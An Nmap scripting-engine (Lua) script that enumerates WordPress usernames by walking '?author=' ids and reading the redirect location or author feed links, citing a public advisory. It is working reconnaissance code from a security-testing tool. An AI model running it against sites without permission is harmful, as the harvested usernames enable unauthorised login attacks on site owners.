local http = require "http"
local io = require "io"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"

description = [[
Enumerates usernames in Wordpress blog/CMS installations by exploiting an information disclosure vulnerability existing in versions 2.6, 3.1, 3.1.1, 3.1.3 and 3.2-beta2 and possibly others.

Original advisory:
* http://www.talsoft.com.ar/index.php/research/security-advisories/wordpress-user-id-and-user-name-disclosure
]]

---
-- @usage
-- nmap -p80 --script http-wordpress-enum <target>
-- nmap -sV --script http-wordpress-enum --script-args limit=50 <target>
--
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-wordpress-enum: 
-- | Username found: admin
-- | Username found: mauricio
-- | Username found: cesar
-- | Username found: lean
-- | Username found: alex
-- | Username found: ricardo
-- |_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-enum.limit'
-- 
-- @args http-wordpress-enum.limit Upper limit for ID search. Default: 25
-- @args http-wordpress-enum.basepath Base path to Wordpress. Default: /
-- @args http-wordpress-enum.out If set it saves the username list in this file.
---

author = "Paulino Calderon"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"auth", "intrusive", "vuln"}


portrule = shortport.http

---
-- Returns the username extracted from the url corresponding to the id passed
-- If user id doesn't exists returns false
-- @param host Host table
-- @param port Port table
-- @param path Base path to WP
-- @param id User id
-- @return false if not found otherwise it returns the username
---
local function get_wp_user(host, port, path, id)
  stdnse.print_debug(2, "%s: Trying to get username with id %s", SCRIPT_NAME, id)
  local req = http.get(host, port, path.."?author="..id, { no_cache = true})
  if req.status then
    stdnse.print_debug(1, "%s: User id #%s returned status %s", SCRIPT_NAME, id, req.status)
    if req.status == 301 then
      local _, _, user = string.find(req.header.location, 'https?://.*/.*/(.*)/')
      return user
    elseif req.status == 200 then
      -- Users with no posts get a 200 response, but the name is in an RSS link.
      -- http://seclists.org/nmap-dev/2011/q3/812
      local _, _, user = string.find(req.body, 'https?://.-/author/(.-)/feed/')
      return user
    end
  end
  return false
end

---
--Returns true if WP installation exists.
--We assume an installation exists if wp-login.php is found
--@param host Host table
--@param port Port table
--@param path Path to WP
--@return True if WP was found
--
local function check_wp(host, port, path)
  stdnse.print_debug(2, "%s:Checking %swp-login.php ", SCRIPT_NAME, path)
  local req = http.get(host, port, path.."wp-login.php", {no_cache=true})
  if req.status and req.status == 200 then
    return true
  end
  return false
end

---
--Writes string to file
--Taken from: hostmap.nse
--@param filename Target filename
--@param contents String to save
--@return true when successful
local function write_file(filename, contents)
  local f, err = io.open(filename, "w")
  if not f then
    return f, err
  end
  f:write(contents)
  f:close()
  return true
end


---
--MAIN
---
action = function(host, port)
  local basepath = stdnse.get_script_args("http-wordpress-enum.basepath") or "/"
  local limit = stdnse.get_script_args("http-wordpress-enum.limit") or 25
  local filewrite = stdnse.get_script_args("http-wordpress-enum.out")
  local output = {""}
  local users = {}
  --First, we check this is WP
  if not(check_wp(host, port, basepath)) then
    if nmap.verbosity() >= 2 then
      return "[Error] Wordpress installation was not found. We couldn't find wp-login.php"
    else
      return
    end
  end

  --Incrementing ids to enum users
  for i=1, tonumber(limit) do
    local user = get_wp_user(host, port, basepath, i)
    if user then
      stdnse.print_debug(1, "%s: Username found -> %s", SCRIPT_NAME, user)
      output[#output+1] = string.format("Username found: %s", user)
      users[#users+1] = user
    end
  end

  if filewrite and #users>0 then
    local status, err = write_file(filewrite,  stdnse.strjoin("\n", users))
    if status then
      output[#output+1] = string.format("Users saved to %s\n", filewrite)
    else
      output[#output+1] = string.format("Error saving %s: %s\n", filewrite, err)
    end
  end
 
  if #output > 1 then
    output[#output+1] = string.format("Search stopped at ID #%s. Increase the upper limit if necessary with 'http-wordpress-enum.limit'", limit)
    return stdnse.strjoin("\n", output)
  end
end
